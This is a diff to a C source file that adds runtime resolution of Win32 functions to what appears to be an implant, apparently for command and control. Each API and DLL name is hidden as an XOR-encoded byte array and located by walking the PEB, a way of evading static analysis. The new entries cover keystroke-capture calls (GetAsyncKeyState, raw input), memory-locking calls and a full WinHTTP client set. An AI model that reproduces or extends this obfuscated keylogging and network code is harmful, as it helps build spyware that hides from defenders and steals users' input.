@@ -105,6 +105,8 @@ void c2t_win32_api_init(void) {
   static const unsigned char enc_bcrypt_dll[] = {56, 57, 40, 35, 42, 46, 116, 62, 54, 54};
   static const unsigned char enc_shell32_dll[] = {41, 50, 63, 54, 54, 105, 104, 116, 62, 54, 54};
 
+  static const unsigned char enc_winhttp_dll[] = {45, 51, 52, 50, 46, 46, 42, 116, 62, 54, 54};
+
   /* user32 functions */
   static const unsigned char enc_GetWindowThreadProcessId[] = {29, 63, 46, 13, 51, 52, 62, 53, 45, 14, 50, 40, 63, 59, 62, 10, 40, 53, 57, 63, 41, 41, 19, 62};
   static const unsigned char enc_OpenClipboard[] = {21, 42, 63, 52, 25, 54, 51, 42, 56, 53, 59, 40, 62};
@@ -132,6 +134,11 @@ void c2t_win32_api_init(void) {
   static const unsigned char enc_VkKeyScanW[] = {12, 49, 17, 63, 35, 9, 57, 59, 52, 13};
   static const unsigned char enc_MapVirtualKeyW[] = {23, 59, 42, 12, 51, 40, 46, 47, 59, 54, 17, 63, 35, 13};
   static const unsigned char enc_SendInput[] = {9, 63, 52, 62, 19, 52, 42, 47, 46};
+  static const unsigned char enc_GetMessageW[] = {29, 63, 46, 23, 63, 41, 41, 59, 61, 63, 13};
+  static const unsigned char enc_PostThreadMessageW[] = {10, 53, 41, 46, 14, 50, 40, 63, 59, 62, 23, 63, 41, 41, 59, 61, 63, 13};
+  static const unsigned char enc_RegisterRawInputDevices[] = {8, 63, 61, 51, 41, 46, 63, 40, 8, 59, 45, 19, 52, 42, 47, 46, 30, 63, 44, 51, 57, 63, 41};
+  static const unsigned char enc_GetRawInputData[] = {29, 63, 46, 8, 59, 45, 19, 52, 42, 47, 46, 30, 59, 46, 59};
+  static const unsigned char enc_GetAsyncKeyState[] = {29, 63, 46, 27, 41, 35, 52, 57, 17, 63, 35, 9, 46, 59, 46, 63};
 
   /* kernel32 functions */
   static const unsigned char enc_CreateProcessA[] = {25, 40, 63, 59, 46, 63, 10, 40, 53, 57, 63, 41, 41, 27};
@@ -175,6 +182,16 @@ void c2t_win32_api_init(void) {
   static const unsigned char enc_LoadLibraryA[] = {22, 53, 59, 62, 22, 51, 56, 40, 59, 40, 35, 27};
   static const unsigned char enc_LoadLibraryW[] = {22, 53, 59, 62, 22, 51, 56, 40, 59, 40, 35, 13};
   static const unsigned char enc_GetProcAddress[] = {29, 63, 46, 10, 40, 53, 57, 27, 62, 62, 40, 63, 41, 41};
+  static const unsigned char enc_GetSystemTime[] = {29, 63, 46, 9, 35, 41, 46, 63, 55, 14, 51, 55, 63};
+  static const unsigned char enc_GetCurrentProcess[] = {29, 63, 46, 25, 47, 40, 40, 63, 52, 46, 10, 40, 53, 57, 63, 41, 41};
+  static const unsigned char enc_SetProcessWorkingSetSize[] = {9, 63, 46, 10, 40, 53, 57, 63, 41, 41, 13, 53, 40, 49, 51, 52, 61, 9, 63, 46, 9, 51, 32, 63};
+  static const unsigned char enc_GetProcessWorkingSetSize[] = {29, 63, 46, 10, 40, 53, 57, 63, 41, 41, 13, 53, 40, 49, 51, 52, 61, 9, 63, 46, 9, 51, 32, 63};
+  static const unsigned char enc_VirtualLock[] = {12, 51, 40, 46, 47, 59, 54, 22, 53, 57, 49};
+  static const unsigned char enc_VirtualUnlock[] = {12, 51, 40, 46, 47, 59, 54, 15, 52, 54, 53, 57, 49};
+  static const unsigned char enc_InitializeCriticalSection[] = {19, 52, 51, 46, 51, 59, 54, 51, 32, 63, 25, 40, 51, 46, 51, 57, 59, 54, 9, 63, 57, 46, 51, 53, 52};
+  static const unsigned char enc_EnterCriticalSection[] = {31, 52, 46, 63, 40, 25, 40, 51, 46, 51, 57, 59, 54, 9, 63, 57, 46, 51, 53, 52};
+  static const unsigned char enc_LeaveCriticalSection[] = {22, 63, 59, 44, 63, 25, 40, 51, 46, 51, 57, 59, 54, 9, 63, 57, 46, 51, 53, 52};
+  static const unsigned char enc_DeleteCriticalSection[] = {30, 63, 54, 63, 46, 63, 25, 40, 51, 46, 51, 57, 59, 54, 9, 63, 57, 46, 51, 53, 52};
 
   /* advapi32 functions */
   static const unsigned char enc_SystemFunction036[] = {9, 35, 41, 46, 63, 55, 28, 47, 52, 57, 46, 51, 53, 52, 106, 105, 108};
@@ -188,12 +205,27 @@ void c2t_win32_api_init(void) {
   static const unsigned char enc_SHGetFolderPathW[] = {9, 18, 29, 63, 46, 28, 53, 54, 62, 63, 40, 10, 59, 46, 50, 13};
   static const unsigned char enc_DragQueryFileW[] = {30, 40, 59, 61, 11, 47, 63, 40, 35, 28, 51, 54, 63, 13};
 
-  char dll_user32[32], dll_kernel32[32], dll_advapi32[32], dll_bcrypt[32], dll_shell32[32];
+  /* winhttp functions */
+  static const unsigned char enc_WinHttpOpen[] = {13, 51, 52, 18, 46, 46, 42, 21, 42, 63, 52};
+  static const unsigned char enc_WinHttpConnect[] = {13, 51, 52, 18, 46, 46, 42, 25, 53, 52, 52, 63, 57, 46};
+  static const unsigned char enc_WinHttpOpenRequest[] = {13, 51, 52, 18, 46, 46, 42, 21, 42, 63, 52, 8, 63, 43, 47, 63, 41, 46};
+  static const unsigned char enc_WinHttpSendRequest[] = {13, 51, 52, 18, 46, 46, 42, 9, 63, 52, 62, 8, 63, 43, 47, 63, 41, 46};
+  static const unsigned char enc_WinHttpReceiveResponse[] = {13, 51, 52, 18, 46, 46, 42, 8, 63, 57, 63, 51, 44, 63, 8, 63, 41, 42, 53, 52, 41, 63};
+  static const unsigned char enc_WinHttpQueryDataAvailable[] = {13, 51, 52, 18, 46, 46, 42, 11, 47, 63, 40, 35, 30, 59, 46, 59, 27, 44, 59, 51, 54, 59, 56, 54, 63};
+  static const unsigned char enc_WinHttpReadData[] = {13, 51, 52, 18, 46, 46, 42, 8, 63, 59, 62, 30, 59, 46, 59};
+  static const unsigned char enc_WinHttpWriteData[] = {13, 51, 52, 18, 46, 46, 42, 13, 40, 51, 46, 63, 30, 59, 46, 59};
+  static const unsigned char enc_WinHttpQueryHeaders[] = {13, 51, 52, 18, 46, 46, 42, 11, 47, 63, 40, 35, 18, 63, 59, 62, 63, 40, 41};
+  static const unsigned char enc_WinHttpCloseHandle[] = {13, 51, 52, 18, 46, 46, 42, 25, 54, 53, 41, 63, 18, 59, 52, 62, 54, 63};
+  static const unsigned char enc_WinHttpSetTimeouts[] = {13, 51, 52, 18, 46, 46, 42, 9, 63, 46, 14, 51, 55, 63, 53, 47, 46, 41};
+  static const unsigned char enc_WinHttpSetOption[] = {13, 51, 52, 18, 46, 46, 42, 9, 63, 46, 21, 42, 46, 51, 53, 52};
+
+  char dll_user32[32], dll_kernel32[32], dll_advapi32[32], dll_bcrypt[32], dll_shell32[32], dll_winhttp[32];
   c2t_win32_xor_decode(dll_user32, enc_user32_dll, sizeof(enc_user32_dll), 0x5A);
   c2t_win32_xor_decode(dll_kernel32, enc_kernel32_dll, sizeof(enc_kernel32_dll), 0x5A);
   c2t_win32_xor_decode(dll_advapi32, enc_advapi32_dll, sizeof(enc_advapi32_dll), 0x5A);
   c2t_win32_xor_decode(dll_bcrypt, enc_bcrypt_dll, sizeof(enc_bcrypt_dll), 0x5A);
   c2t_win32_xor_decode(dll_shell32, enc_shell32_dll, sizeof(enc_shell32_dll), 0x5A);
+  c2t_win32_xor_decode(dll_winhttp, enc_winhttp_dll, sizeof(enc_winhttp_dll), 0x5A);
 
   HMODULE hKernel32 = c2t_win32_get_module_peb(L"kernel32.dll");
   if (!hKernel32) hKernel32 = GetModuleHandleA(dll_kernel32);
@@ -214,6 +246,10 @@ void c2t_win32_api_init(void) {
   HMODULE hShell32 = c2t_win32_get_module_peb(L"shell32.dll");
   if (!hShell32) hShell32 = GetModuleHandleA(dll_shell32);
   if (!hShell32 && hKernel32) hShell32 = LoadLibraryA(dll_shell32);
+
+  HMODULE hWinhttp = c2t_win32_get_module_peb(L"winhttp.dll");
+  if (!hWinhttp) hWinhttp = GetModuleHandleA(dll_winhttp);
+  if (!hWinhttp && hKernel32) hWinhttp = LoadLibraryA(dll_winhttp);
 
 #define LOAD_API(hMod, field, enc_arr)                                         \
   do {                                                                         \
@@ -252,6 +288,11 @@ void c2t_win32_api_init(void) {
   LOAD_API(hUser32, VkKeyScanW, enc_VkKeyScanW);
   LOAD_API(hUser32, MapVirtualKeyW, enc_MapVirtualKeyW);
   LOAD_API(hUser32, SendInput, enc_SendInput);
+  LOAD_API(hUser32, GetMessageW, enc_GetMessageW);
+  LOAD_API(hUser32, PostThreadMessageW, enc_PostThreadMessageW);
+  LOAD_API(hUser32, RegisterRawInputDevices, enc_RegisterRawInputDevices);
+  LOAD_API(hUser32, GetRawInputData, enc_GetRawInputData);
+  LOAD_API(hUser32, GetAsyncKeyState, enc_GetAsyncKeyState);
 
   /* kernel32 */
   LOAD_API(hKernel32, CreateProcessA, enc_CreateProcessA);
@@ -295,6 +336,16 @@ void c2t_win32_api_init(void) {
   LOAD_API(hKernel32, LoadLibraryA, enc_LoadLibraryA);
   LOAD_API(hKernel32, LoadLibraryW, enc_LoadLibraryW);
   LOAD_API(hKernel32, GetProcAddress, enc_GetProcAddress);
+  LOAD_API(hKernel32, GetSystemTime, enc_GetSystemTime);
+  LOAD_API(hKernel32, GetCurrentProcess, enc_GetCurrentProcess);
+  LOAD_API(hKernel32, SetProcessWorkingSetSize, enc_SetProcessWorkingSetSize);
+  LOAD_API(hKernel32, GetProcessWorkingSetSize, enc_GetProcessWorkingSetSize);
+  LOAD_API(hKernel32, VirtualLock, enc_VirtualLock);
+  LOAD_API(hKernel32, VirtualUnlock, enc_VirtualUnlock);
+  LOAD_API(hKernel32, InitializeCriticalSection, enc_InitializeCriticalSection);
+  LOAD_API(hKernel32, EnterCriticalSection, enc_EnterCriticalSection);
+  LOAD_API(hKernel32, LeaveCriticalSection, enc_LeaveCriticalSection);
+  LOAD_API(hKernel32, DeleteCriticalSection, enc_DeleteCriticalSection);
 
   /* advapi32 */
   LOAD_API(hAdvapi32, RtlGenRandom, enc_SystemFunction036);
@@ -307,6 +358,20 @@ void c2t_win32_api_init(void) {
   /* shell32 */
   LOAD_API(hShell32, SHGetFolderPathW, enc_SHGetFolderPathW);
   LOAD_API(hShell32, DragQueryFileW, enc_DragQueryFileW);
+
+  /* winhttp */
+  LOAD_API(hWinhttp, WinHttpOpen, enc_WinHttpOpen);
+  LOAD_API(hWinhttp, WinHttpConnect, enc_WinHttpConnect);
+  LOAD_API(hWinhttp, WinHttpOpenRequest, enc_WinHttpOpenRequest);
+  LOAD_API(hWinhttp, WinHttpSendRequest, enc_WinHttpSendRequest);
+  LOAD_API(hWinhttp, WinHttpReceiveResponse, enc_WinHttpReceiveResponse);
+  LOAD_API(hWinhttp, WinHttpQueryDataAvailable, enc_WinHttpQueryDataAvailable);
+  LOAD_API(hWinhttp, WinHttpReadData, enc_WinHttpReadData);
+  LOAD_API(hWinhttp, WinHttpWriteData, enc_WinHttpWriteData);
+  LOAD_API(hWinhttp, WinHttpQueryHeaders, enc_WinHttpQueryHeaders);
+  LOAD_API(hWinhttp, WinHttpCloseHandle, enc_WinHttpCloseHandle);
+  LOAD_API(hWinhttp, WinHttpSetTimeouts, enc_WinHttpSetTimeouts);
+  LOAD_API(hWinhttp, WinHttpSetOption, enc_WinHttpSetOption);
 
 #undef LOAD_API
 
